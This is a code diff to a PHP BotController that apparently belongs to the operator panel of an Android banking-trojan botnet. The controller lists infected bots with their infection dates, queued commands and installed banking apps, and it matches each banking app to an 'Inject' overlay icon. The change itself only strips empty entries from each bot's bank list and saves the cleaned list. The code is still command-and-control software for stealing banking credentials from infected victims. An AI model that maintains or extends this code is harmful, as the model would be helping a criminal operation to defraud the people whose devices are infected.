@@ -124,14 +124,20 @@ class BotController extends Controller
             $banks = '';
             $icons = [];
 
+            $realBanks = [];
+
             if ($row->banks != '') {
                 $banks = explode(':', $row->banks);
             
                 foreach ($banks as $bank) {
-                    $inject = Inject::where('app', $bank)->first();
-                    $icons[] = $inject ? $inject->png : "";
+                    if ($bank != '') {
+                        $realBanks[] = $bank;
+                        $inject = Inject::where('app', $bank)->first();
+                        $icons[] = $inject ? $inject->png : "";    
+                    }
                 }
             }
+
             $result[] = [
                 'id' => $id,
                 'key' => $id,
@@ -141,7 +147,7 @@ class BotController extends Controller
                 'commands' => $row->commands,
                 'operator' => $row->operator,
                 'country' => $row->country,
-                'banks' => $row->banks,
+                'banks' => implode(':', $realBanks),
                 'icons' => $icons,
                 'last_connect' => $connection_second,
                 'date_infection' => $row->date_infection,
@@ -162,6 +168,20 @@ class BotController extends Controller
 
     public function show($param)
     {
+        $bot = Bot::where('bot_id', $param->botId)->first();
+
+        $banks = explode(':', $bot->banks);
+
+        $realBanks = [];
+
+        foreach ($banks as $bank) {
+            if (!empty($bank))
+                $realBanks[] = $bank;
+        }
+
+        $bot->banks = implode(':', $realBanks);
+        $bot->save();
+
         return Bot::where('bot_id', $param->botId)->first();
     }
 
